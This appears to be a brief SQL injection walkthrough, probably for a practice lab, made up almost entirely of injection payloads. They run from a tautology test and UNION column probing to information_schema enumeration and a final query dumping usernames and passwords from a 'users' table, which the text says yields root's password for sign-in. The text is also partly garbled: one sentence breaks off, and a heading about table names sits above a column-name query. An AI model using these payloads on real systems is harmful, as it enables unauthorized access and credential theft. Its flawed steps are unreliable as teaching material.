# SQL Injection Walkthrough

## Step 1: Test for Input Type
Begin by testing the input type to understand how the application processes user
```sql
1 OR 1=1--
```


## Step 2: Check the Number of Output Fields
Use the following query:
```sql
1' UNION SELECT null, null, null FROM information_schema.tables;-- -
```
This query checks the number of output fields by trying different numbers of null values.

### Step 3: Find Table Names
Use the following query to retrieve table names:
```sql
1' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name='users';-- -
```
This query retrieves column names from the users table.

### Step 4: Retrieve Name and Password Columns from a Known Table
Use the following query:

```sql
1' UNION SELECT username, password, null FROM users;-- -
```
This query retrieves the username and password columns from the users table.
The table displays the root’s password, which can be used to sign in.

